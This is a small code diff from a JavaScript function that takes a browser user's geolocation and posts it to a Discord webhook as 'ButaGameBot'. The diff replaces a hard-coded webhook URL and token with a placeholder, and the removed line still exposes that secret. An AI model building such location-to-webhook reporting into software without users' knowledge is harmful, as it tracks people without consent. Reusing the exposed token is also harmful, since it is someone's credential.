@@ -125,7 +125,7 @@ function sendLocationToWebhook() {
     if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(position => {
             const { latitude, longitude } = position.coords;
-            const webhookUrl = 'https://discord.com/api/webhooks/1357338228004487341/YOjCQVGU-IMzYt_ZP9-YJjUags_DeF8eGap3JPEiTGRio98s1h8FIlcGxvuZwYyTV0H6';
+            const webhookUrl = 'YOUR_DISCORD_WEBHOOK_URL_HERE';
             const data = {
                 content: `User location: Latitude ${latitude}, Longitude ${longitude}`,
                 username: 'ButaGameBot'
